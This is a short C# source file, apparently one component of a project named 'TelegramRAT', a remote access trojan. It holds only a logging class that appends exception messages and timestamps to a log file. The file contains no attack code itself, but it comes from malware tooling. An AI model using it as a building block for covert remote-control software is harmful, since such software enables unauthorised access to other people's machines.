using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.IO;

namespace TelegramRAT
{
    public static class Log
    {
        public static void WriteError(string method, Exception ex)
        {
            if (Config.logErrors)
            {
                using (StreamWriter writer = File.AppendText(Config.log_file))
                {
                    writer.WriteLine(method + ": " + ex.Message + (ex.InnerException != null ? " " + ex.InnerException.Message : String.Empty) + "(" + System.DateTime.Now + ")");
                }
            }
        }
    }
}
